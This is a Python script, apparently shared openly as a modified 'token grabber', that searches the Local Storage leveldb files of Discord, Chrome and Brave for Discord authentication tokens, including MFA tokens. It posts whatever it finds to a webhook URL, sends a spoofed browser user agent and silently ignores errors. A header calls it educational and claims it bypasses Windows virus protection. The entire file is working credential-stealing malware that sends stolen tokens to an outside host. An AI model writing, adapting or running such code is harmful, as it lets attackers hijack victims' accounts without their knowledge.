# PLEASE NOTE THIS IS FOR EDUCATIONAL REASONS *ONLY* PLEASE DON'T USE THIS FOR ANYTHING OTHER THEN EDUCATIONAL REASONS
# THIS BYPASSES WINDOWS VIRUS AND THREAT PROTECTION | THIS IS A MODIFIED VERSION OF wodxgod's TOKEN GRABBER | https://github.com/wodxgod?tab=repositories

import os
import re
import json
import requests

WEBHOOK_URL = ''
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if file_name.endswith('.log') or file_name.endswith('.ldb'):
            with open(f'{path}\\{file_name}', errors='ignore') as file:
                for line in file:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        tokens.extend(re.findall(regex, line))
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if tokens:
            message += '\n'.join(tokens)
        else:
            message += 'No users found.'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        requests.post(WEBHOOK_URL, data=payload, headers=headers)
    except Exception as e:
        pass

if __name__ == '__main__':
    main()
